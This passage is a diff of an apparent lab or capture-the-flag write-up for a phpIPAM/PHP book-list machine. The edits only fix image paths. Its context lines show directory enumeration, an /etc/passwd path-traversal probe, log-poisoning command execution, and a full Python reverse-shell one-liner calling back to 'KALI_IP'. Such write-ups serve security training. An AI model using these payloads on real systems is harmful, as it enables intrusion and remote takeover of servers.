@@ -52,16 +52,16 @@ gobuster dir -u http://$IP/ -w /usr/share/wordlists/dirb/common.txt
 
 Found endpoints `/app` and `/backup` returning HTTP 403 Forbidden. The server runs phpIPAM 1.4:
 
-![Screenshot](../../attachments/Pasted%20image%2020260605213451.png)
+![Screenshot](../../attachments/Pasted image 20260605213451.png)
 
 #### Port 8593 (PHP CLI Web Application) - LFI Discovery
 Navigating to `http://$IP:8593/` reveals a "Book List" interface:
 
-![Screenshot](../../attachments/Pasted%20image%2020260605222401.png)
+![Screenshot](../../attachments/Pasted image 20260605222401.png)
 
 Clicking on a book reveals that content is dynamically fetched using a `book` query parameter:
 
-![Screenshot](../../attachments/Pasted%20image%2020260605222942.png)
+![Screenshot](../../attachments/Pasted image 20260605222942.png)
 
 Testing for Directory Traversal:
 
@@ -69,7 +69,7 @@ Testing for Directory Traversal:
 http://$IP:8593/index.php?book=../../../../etc/passwd
 ```
 
-![Screenshot](../../attachments/Pasted%20image%2020260605233907.png)
+![Screenshot](../../attachments/Pasted image 20260605233907.png)
 
 The contents of `/etc/passwd` are rendered directly into the HTML body, confirming LFI.
 
@@ -110,7 +110,7 @@ Execute system commands by including the access log and supplying the `cmd` para
 http://$IP:8593/index.php?book=../../../../../var/log/apache2/access.log&cmd=whoami
 ```
 
-![Screenshot](../../attachments/Pasted%20image%2020260606124120.png)
+![Screenshot](../../attachments/Pasted image 20260606124120.png)
 
 The command output confirms code execution as `www-data`.
 
@@ -130,7 +130,7 @@ Standard Bash one-liners failed due to URL encoding conflicts. We deploy a Pytho
    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("KALI_IP",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("sh")'
    ```
 
-![Screenshot](../../attachments/Pasted%20image%2020260606130720.png)
+![Screenshot](../../attachments/Pasted image 20260606130720.png)
 
 A reverse shell connects back to our listener:
 
